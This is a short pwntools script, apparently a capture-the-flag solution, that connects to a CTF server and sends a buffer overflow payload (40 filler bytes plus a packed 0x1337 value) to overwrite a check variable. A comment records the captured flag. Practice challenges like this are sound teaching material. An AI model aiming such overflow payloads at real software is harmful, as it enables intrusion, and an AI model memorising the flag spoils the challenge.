from pwn import *

p = remote("ctf.wcsc.usf.edu", 31344)
# p = process("./cookie")

cookie = p32(0x1337)

payload = "A" * 40 + cookie

p.sendline(payload)
p.interactive()

# flag : wcsc{buff3r_0v3rfl0w5_ar3_r3411y_fun}
